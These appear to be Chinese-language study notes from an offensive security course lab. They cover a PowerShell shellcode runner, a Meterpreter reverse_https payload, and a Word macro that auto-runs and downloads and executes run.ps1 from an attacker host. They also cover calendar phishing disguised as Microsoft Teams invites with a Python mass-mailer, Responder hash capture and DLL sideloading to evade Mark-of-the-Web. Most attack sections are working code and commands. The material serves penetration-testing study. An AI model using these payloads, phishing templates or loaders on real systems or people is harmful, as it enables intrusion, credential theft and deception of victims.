在 PowerShell 使用 C# [DllImportAttribute class](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.dllimportattribute?view=net-10.0&viewFallbackFrom=netframework-4.8%3E) 宣告 Win32 API

使用 Microsoft 的 [Microsoft's Platform Invocation Services](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke)(P/Invoke）完成此操作: P/Invoke API 位於 [System](https://docs.microsoft.com/en-us/dotnet/api/system?view=netframework-4.8) 和 [System.Runtime.InteropServices](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices?view=netframework-4.8) namespaces 中，需要透過 using keyword 匯入

#### - C prototype 到 C# signature 的轉換
C prototype：
```c
int MessageBox(
  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);
```
轉成 C# P/Invoke signature：
```csharp
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
```

將建立 C# class (User32)，並使用 DllImport 導入 MessageBox signature，這個 class 將允許我們與 Windows API 互動
```cpp
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
```
PowerShell 的 [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-5.1) 可以把 C# code 動態編譯進目前 PowerShell session\
[Here string](https://devblogs.microsoft.com/scripting/powertip-use-here-strings-with-powershell/) (`@"..."@`) 可以放多行文字
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32
```
> - `Add-Type $User32`: 讓 .NET 編譯 $User32 裡的 C# code\
> 編譯完成後，PowerShell session 裡就多了一個 C# class User32，可以呼叫 `[User32]::MessageBox(...)` 

- `[ClassName]::MethodName(arguments)`
PowerShell 呼叫 .NET static method 的語法
```powershell
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```
呼叫 User32 class 裡的 static MessageBox method，會彈出一個 Windows message box\
環境範例中是為了證明 PowerShell 可以透過 Add-Type + C# + DllImport 呼叫 Win32 API
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```
![image](https://hackmd.io/_uploads/BJ0sXxOWzg.png)


同樣技術也呼叫其他 API:
```
GetDriveType
VirtualAlloc
RtlMoveMemory
CreateThread
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
```

例如 GetDriveType 判斷某個磁碟路徑的磁碟類型：
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern uint GetDriveType(string lpRootPathName);
}
"@

Add-Type $Kernel32

[Kernel32]::GetDriveType("C:\")
```
![image](https://hackmd.io/_uploads/rkmmVx_Zzg.png)
> 3 - DRIVE_FIXED

### Porting Shellcode Runner to PowerShell
將上述 VBA shellcode runner 搬到 PowerShell 後，再改成由 Word macro 下載遠端 run.ps1 到記憶體後執行

在 VBA code 中是使用 `RtlMoveMemory` 複製 shellcode，但在 PowerShell .Net 使用 System.Runtime.InteropServices.Marshal namespace 的 [COPY](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8) method (`[System.Runtime.InteropServices.Marshal]::Copy()`)


因為 PowerShell shellcode 是 managed byte array `[Byte[]] $buf = 0xfc,0x48,0x83,...`，而 VirtualAlloc 回傳的是 unmanaged memory pointer:\
需要把 managed byte array 複製到 unmanaged memory address，就可以用 `[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)`

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
```


完整 PowerShell shellcode runner:\
用 C# 宣告 Win32 API\
→ 交給 PowerShell Add-Type 編譯\
→ 之後 PowerShell 可以呼叫 `[Kernel32]::VirtualAlloc()`
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

Add-Type $Kernel32
```

完成 shellcode runner 後，開始構造 payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread -f ps1
```
![image](https://hackmd.io/_uploads/Skp6AeYbMl.png)

建構完整 payload.ps1
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        UInt32 dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        UInt32 dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        UInt32 dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

Add-Type $Kernel32

# payload
[Byte[]] $buf = 0xfc,0x48, ... ,0xda,0xff,0xd5

$size = $buf.Length

Write-Host "Shellcode length:" $size

[IntPtr] $addr = [Kernel32]::VirtualAlloc(
    [IntPtr]::Zero,
    $size,
    0x3000,
    0x40
)

[System.Runtime.InteropServices.Marshal]::Copy(
    $buf,
    0,
    $addr,
    $size
)

[IntPtr] $threadHandle = [Kernel32]::CreateThread(
    [IntPtr]::Zero,
    0,
    $addr,
    [IntPtr]::Zero,
    0,
    [IntPtr]::Zero
)

[Kernel32]::WaitForSingleObject($threadHandle, [UInt32]0xFFFFFFFF)
```


完整 Word Macro Cradle:
Word 裡的 VBA macro 不需要再放 shellcode 只放 IEX
```vba
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

整體流程:
```
Word 開啟
→ Document_Open / AutoOpen 觸發
→ MyMacro 執行
→ Shell 啟動 powershell.exe
→ PowerShell 下載 run.ps1
→ IEX 執行 run.ps1
```

利用 Meterpreter 接收 shell
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <KALI_IP>
set LPORT 443
run
```
觀察 Apache log: `sudo tail -f /var/log/apache2/access.log`

# Phishing with Calendars
Phishing 是一種常用的入侵手段，用於獲取系統和敏感資訊的存取權限\
傳統 phishing:
```
寄 Email → 放惡意連結 / 附件 → 誘導使用者點擊
```
現今 scammers 常利用 calendar invites 等新方式繞過安全措施，攻擊手法對應  MITRE ATT&CK framework 的 [phishing technique (T1566)](https://attack.mitre.org/techniques/T1566/)

將探討攻擊者如何利用 calendar invites 作為 initial access，使用 [iCalendar](https://docs.fileformat.com/email/ics/) (ICS) 檔案格式[建立欺騙性邀請](https://www.bleepingcomputer.com/news/security/wells-fargo-phishing-baits-customers-with-calendar-invites/)

>[!Note]
>為什麼 Calendar Invite 可以被濫用？\
>行事曆邀請通常會被系統自動解析，甚至自動加入行事曆。
>常見平台都支援 ICS：
>```
>Google Calendar
>Microsoft Outlook
>Apple Calendar
>其他企業行事曆系統
>```
>把惡意內容藏在: 會議標題、會議描述、主辦者名稱、會議地點、會議連結、附件、提醒通知等等


## Calendar as an Initial Access Vector
首先分析 iCalendar (ICS) 標準及結構，再利用 Calendar invite 當作 Initial Access
### The iCalendar (ICS) standard
`.ics` 是一種純文字格式，由 Internet Engineering Task Force (IETF) 定義 [RFC 5545](https://datatracker.ietf.org/doc/html/rfc5545) 標準，用來描述行事曆資料

- ICS 的基本結構:
通常會有外層包裝 `BEGIN:VCALENDAR`...`END:VCALENDAR`
裡面包含不同 component
    - `VEVENT`: 行事曆事件，例如會議
    - `VTODO`: 待辦事項
    - `VJOURNAL`: 日誌項目

ICS property 每個屬性都是 key-value pair 每一行一個屬性\ 
phishing calendar invite 通常是偽裝成會議邀請: `VEVENT`\
```ics
BEGIN:VCALENDAR
VERSION:2.0
METHOD:REQUEST
BEGIN:VEVENT
ORGANIZER;CN="CHW Wei":mailto:CHWWei@example.com
DTSTART;TZID=America/New_York:20231015T090000
DTEND;TZID=America/New_York:20231015T100000
DESCRIPTION:Weekly team meeting to discuss project updates and milestones.
END:VEVENT
END:VCALENDAR
```
> - `ORGANIZER`:主辦者欄位
>     - `CN="CHW Wei"`:顯示名稱
>     - `mailto:CHWWei@example.com`: 主辦者 email
> - `DTSTART`: 會議開始時間
>     - `TZID=America/New_York`: 時區
>     - `20231015T090000`: 2023-10-15 09:00:00
> - `DTEND`: 會議結束時間
> - `DESCRIPTION`: 會議描述 (會議議程、會議目的)
> calendar phishing 很常被利用的位置: 登入查看會議內容、重新驗證帳號、查看附件、點擊會議連結

### Creating a Custom Calendar Invite
手刻一個 `.ics` calendar invite，搭配 HTML email body，用 sendEmail 從 Kali 寄到目標信箱

ics template:
```ics
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```
> - `PRODID:Microsoft Exchange Server 2022`: 看起來像從企業 Exchange / Outlook 環境產生
> - `VERSION:2.0`: 使用 iCalendar 2.0 格式

HTML email body template
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <p>Hello,</p>
    <p>CHW is not a hacker.</p>
    <p>Best regards,Attacker</p>
</body>
</html>
```

實作 ics
1. 建立 ICS 檔
```
vi iCalendar.ics
```
![image](https://hackmd.io/_uploads/HJK3GT1Gzg.png)

2. 建立 HTML template
```
vi template.html
```
![image](https://hackmd.io/_uploads/B1pWmTyMzg.png)

3. 用 sendEmail 寄出
```
sendEmail -s <SMTP IP> -t offsec@corp1.com -f attacker@corp1.com -u "test"  -o message-content-type=html -o message-file=./template.html -a iCalendar.ics
```
> - `-s <SMTP IP>`: SMTP server，教材中是 mail01
> - `-t offsec@corp1.com`: 收件人
> - `-f attacker@corp1.com`: 寄件人
> - `-u "test"`: email subject
> - `-o message-content-type=html`: 信件內容使用 HTML
> - `-o message-file=./template.html`: 使用 template.html 作為信件本文
> - `-a iCalendar.ics`: 附加 ICS calendar invite


![image](https://hackmd.io/_uploads/Syzu7Tkzfx.png)\
![image](https://hackmd.io/_uploads/HyX9XTkMzx.png)

## Abusing Calendars
把上述基本 ICS 邀請包裝得更像真的 Microsoft Teams 會議通知
```
模仿 [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software) 會議通知格式
→ 把會議連結改成攻擊者控制的 URL
→ 附上 iCalendar.ics
→ 用 sendEmail 寄給 offsec@corp1.com
```

###  Crafting The Full Calendar Phishing
將上述陽春的 HTML email body 改成看起來像 [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software) 會議邀請\
如果 phishing email 長得像 Teams invite，使用者比較可能直覺認為它是正常會議通知，這邊利用的 "使用者對熟悉格式的信任"

- HTML template
```html
<p class=MsoNormal style='background:white'><span style='color:black'>We are reaching out to inform you of an urgent meeting scheduled by the HR Department that requires your immediate attention.<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif; color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif; color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```
> `"[ATTACKER_URL]"` 可替換成惡意 URL

![image](https://hackmd.io/_uploads/SkBz7lYzMg.png)

>[!Tip]
> typosquatting techniques: 註冊一個看起來很像合法網域的假網域
> ```
> microsoft.com
>micros0ft.com
>rnicrosoft.com
>micro-soft.com
> ```

透過 
```
┌──(chw💲CHW)-[~/Offsec/OSEP/ICS Phishing]
└─$ sendEmail -s 192.168.50.121 -t offsec@corp1.com -f attacker@corp1.com -u "Urgent HR meeting"  -o message-content-type=html -o message-file=./email.html -a iCalendar.ics
Oct 15 06:44:33 kali sendEmail[1395]: Email was sent successfully!
```
> - `-s`: SMTP server
> - `-t`: offsec@corp1.com	收件者
> - `-f`: attacker@corp1.com	寄件者
> - `-u`: "Urgent HR meeting"	信件主旨
> - `-o message-content-type=html`: email body 使用 HTML
> - `-o message-file=./email.html`: 使用 email.html 作為信件內容
> - `-a iCalendar.ics`: 附加 ICS calendar invite

### Automating the Attack
上述透過手動做 `email.html`, `iCalendar.ics`, `sendEmail 指令`\
🥚 每封信都要手改

把這些東西變成 template，再用 Python 動態替換\
原本硬寫死的 HTML 改成 placeholder

- ICS template
```ics
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo=
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```
> - `{DTSTAMP}`: 事件建立時間戳
> - `{DTSTART}`: 會議開始時間
> - `{DTEND}` : 會議結束時間
> - `{ORGANIZER_NAME}` : 主辦者顯示名稱
> - `{ORGANIZER_EMAIL}` : 主辦者 email
> - `{DESCRIPTION}` : ICS 描述欄位，教材中放 URL
> - `{SUMMARY}` : 會議標題
> - `{ATTENDEES}` : 與會者清單


接著利用 Python 腳本動態取代 ICS 範本中的 placeholders，產生個人化的日曆邀請

使用 `{DTSTAMP}` 此 timestamp 作為活動建立時間戳，確保每份邀請函都有一個 unique identifier

將檔案儲存為 Kali 機器上的 iCalendar_template.ics 開始編寫 Python 腳本

完整 fakeics.py
```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# email settings
EMAIL_SUBJECT = "HR Meeting"

# event settings
EVENT_SUMMARY = "HR meeting"

ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

# template settings
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent company-wide changes and policies. Your attendance is highly encouraged as we will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

def load_template():
    template = ""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        template = f.read()
    return template


def prepare_template(event_url):
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
    return email_template


def load_ics():
    ics = ""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        ics = f.read()
    return ics


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    ics_template = load_ics()
    ics_template = ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,  # Use event_url as DESCRIPTION
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )
    return ics_template


def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
        )
    return "\r\n".join(attendees)


def send_email(smtp_server, sender_email, to, event_url):
    print('Sending email to: ' + to)

    # in .ics file timezone is set to be utc
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # meeting has started 5 minutes ago
    duration = datetime.timedelta(hours=1)  # meeting duration
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % ("invite.ics"))
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()


def main():
    if len(sys.argv) != 5:
        print("Usage: python fakemeeting.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        sys.exit(1)

    smtp_server = sys.argv[1]
    sender_email = sys.argv[2]
    recipient_email = sys.argv[3]
    event_url = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)


if __name__ == "__main__":
    main()
```

### Credential Stealing with Responder
建構完 phishing template，接著利用 Kali responder 偽造會議連結

整體流程變成
```
Kali 啟動 Responder
→ 寄出仿 Teams calendar invite
→ client01 使用者點擊 meeting link
→ 瀏覽器連到 Kali HTTP server
→ Responder 回應 authentication challenge
→ Windows 顯示登入提示
→ 使用者輸入帳密
→ Responder 捕獲 NetNTLMv2 hash
→ Kali 用 hashcat 嘗試破解
```

[Responder](https://www.kali.org/tools/responder/) 是內網滲透測試常用工具，主要用來測試和濫用這些名稱解析與認證機制: [LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution), [NBT-NS](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP), [mDNS](https://www.ionos.com/digitalguide/server/know-how/multicast-dns/), DNS, HTTP, SMB

寄出釣魚郵件：
```
┌──(chw💲CHW)-[~/Offsec/OSEP/ICS Phishing]
└─$ python3 fakeics.py 192.168.124.121 hr@corp1.com offsec@corp1.com 192.168.45.246
[2026-07-06 05:29:26] python3 fakeics.py 192.168.124.121 hr@corp1.com offsec@corp1.com 192.168.45.246
Sending email to: offsec@corp1.com
/home/chw/Offsec/OSEP/ICS Phishing/fakeics.py:101: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  dtstamp = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
```
同時開啟 Kali responder 等待 user 點擊：
```
sudo responder -I tun0 
```
![image](https://hackmd.io/_uploads/r1G3SeYmGl.png)

模擬 user 點擊會議連結\
![image](https://hackmd.io/_uploads/rJqxIeF7fg.png)

(模擬 user 輸出 credential 後，成功截取 NTLMv2\
![image](https://hackmd.io/_uploads/rkg7LxK7Gx.png)

截取到 NTLMv2 後，用 Hashcat 進行破解\
![image](https://hackmd.io/_uploads/H1ct8gtmfl.png)

# Client Side Attacks with File Containers
利用 file containers (`.zip`, `.iso`, `.img`, `.vhd`, `.rar`, `7z`) 的 Client-side attacks\
攻擊者透過 Microsoft-signed binaries 的行為及處理 DLL loading 的方式，可以繞過常見的防禦措施（例如 Mark-of-the-Web (MotW)），並在目標系統上執行惡意程式碼

>[!Note]
>Mark-of-the-Web (MotW) 指 Windows 會對從 Internet 下載的檔案加上一個標記\
>1. Office 會封鎖 internet-downloaded macro
>2. Windows 可能顯示 SmartScreen / security warning
>3. 某些檔案執行時會有額外警告
>4. Defender / EDR 可能提高風險評分
>
> 標記通常會在 NTFS Alternate Data Stream：`Zone.Identifier`\
> Ex. ZoneId=3 代表 Internet zone

利用 [DLL sideloading](https://attack.mitre.org/techniques/T1574/001/) 技巧，讓一個合法程式載入攻擊者準備的 DLL\
正常 Windows 程式啟動時，常會載入 kernel32.dll、user32.dll、version.dll、winhttp.dll、cryptsp.dll 等 DLL

利用：
```
合法 EXE 啟動
→ 嘗試載入 example.dll
→ 在同目錄找到攻擊者的 example.dll
→ 載入成功
→ DLL 內的程式碼執行
```

## DLL Sideloading Using Signed Microsoft Binaries
DLL sideloading 需要先尋找信任的 Microsoft-signed binaries，識別從 ZIP archives 中提取後不受 Mark-of-the-Web 限制的 binary\
這些 binary 可被利用來從本機目錄載入惡意 DLL，且無需使用者同意或發出警告

1. Microsoft signed
2. 從 ZIP 解壓後可執行
3. MotW 不會有效阻擋
4. 載入外部 DLL
5. DLL search path 可被攻擊者控制

### Finding the Target Application and DLL
Initial access: 可以利用 DLL sideloading 將 payload 偽裝在 email attachment 的 ZIP archive。透過將受信任的 signed Microsoft binary 與 malicious DLL 一起 embeded，我們可以建立一個對使用者看似無害的容器，並且該容器通常能夠繞過常見的 security filters

>[!Note]
> DLL sideloading 利用了 Windows 應用程式載入 Dynamic Link Libraries (DLL) 的方式:\
> 當 application 在沒有指定完整路徑載入 DLL 時，Windows 載入程式會依照預先定義的 DLL search order 進行尋找 **"從應用程式所在的目錄開始"**

攻擊者可以利用此漏洞，將 malicious DLL 放在與合法資料夾中。如果 exe 嘗試載入 system path 或 hardcoded path 但不存在的 DLL 時，Windows 會從當前目錄載入攻擊者的 DLL ，導致程式碼在受信任的 Binary 的上下文中執行，且不會觸發使用者警告

預設 Windows 會依照下列順序搜尋 DLL ：

1. application 載入所在的目錄
2. system 目錄（System32）
3. 16-bit system 目錄
4. Windows 目錄
5. 當前工作目錄
6. PATH 環境變數中列出的目錄

為解決  DLL sideloading 問題，開發人員不能直接使用 `LoadLibraryA("Secur32.dll");`，應該利用 [LoadLibraryExA()](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa) 搭配 flags 控制 DLL 搜尋方式，`LOAD_LIBRARY_SEARCH_*` 限制 DLL 搜尋路徑:
- `LOAD_LIBRARY_SEARCH_SYSTEM32`: 只從 System32 搜尋
- `LOAD_LIBRARY_SEARCH_APPLICATION_DIR`: 從 application directory 搜尋
- `LOAD_LIBRARY_SEARCH_USER_DIRS`: 從使用者明確加入的目錄搜尋
- `LOAD_LIBRARY_SEARCH_DEFAULT_DIRS`: 使用較安全的預設搜尋目錄

明確定義 DLL 可以從哪裡被載入

>[!Note]
>- `SetDefaultDllDirectories()`: 可以設定整個 process 的預設 DLL 搜尋策略，一開始就告訴 Windows：這個 process 之後載入 DLL 時，只能從安全位置搜尋
> - `AddDllDirectory()`是讓程式明確加入一個可信任 DLL 目錄。例如程式真的需要從某個特定資料夾載入自家 DLL，就不要依賴 current directory 或 PATH，而是明確指定："只從 C:\Program Files\Vendor\App\lib 載入"

有了基礎知識後，可以開始選擇 DLL sideloading attack 的 Binary\
由於有效 payload 是透過網路傳遞給 victim，因此需要了解  Mark-of-the-Web (MotW) 概念:\
MotW 是 Windows 系統中的安全功能，在協助使用者防範從網路下載的潛在不安全檔案。Windows 會將 Zone Identifier 的特殊 metadata 新增至額外的 Alternate Data Stream (ADS)

```powershell
PS C:\tools> Get-Content -Path .\putty.exe -Stream Zone.Identifier
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://www.chiark.greenend.org.uk/
HostUrl=https://the.earth.li/~sgtatham/putty/0.83/w64/putty.exe
```
![image](https://hackmd.io/_uploads/BJaYD-AXzg.png)
> ZoneId =3 表示該檔案源自 Internet (Windows 會視為不受信任的檔案)

>[!Tip]
>常見 ZoneId：
>- `0`: Local Machine
>- `1`: Local Intranet
>- `2`: Trusted Sites
>- `3`: Internet
>- `4`: Restricted Sites

[環境範例] \
Microsoft 有很多合法簽章的程式可以被拿來分析，環境範例選擇 OneDrive.exe (`C:\Program Files\Microsoft OneDrive`)

🧠：OneDrive 是否會嘗試從 C:\Tools 這種本機資料夾找 DLL？\
如果 ProcMon 看到 `C:\Tools\Secur32.dll    NAME NOT FOUND`\
代表 OneDrive.exe 曾經嘗試從 C:\Tools 載入 Secur32.dll
但該檔案不存在，即是 sideloading candidate

使用 Sysinternals 套件中的 Process Monitor 來觀察 DLL 的尋找和載入行為
![image](https://hackmd.io/_uploads/ry67hbA7Ge.png)

ProcMon Filter:
Filter 欄位 | 條件 | 值 | 用途 |
:------:|:---------|:---------|:---------|
Process Name  |   contains    |   `OneDrive`  |  只看 OneDrive 相關事件
Operation |   is    |   `CreateFile`  |  看檔案開啟行為
Result  |   is    |   `NAME NOT FOUND`  |  只看找不到的檔案
Path  |   ends with    |   `.dll`  |  只看 DLL
Process Name |   is not    |   `Procmon.exe`  |  排除 ProcMon 自己

![image](https://hackmd.io/_uploads/H1Zj6-C7Gg.png)
![image](https://hackmd.io/_uploads/Hy2iCb07Gx.png)
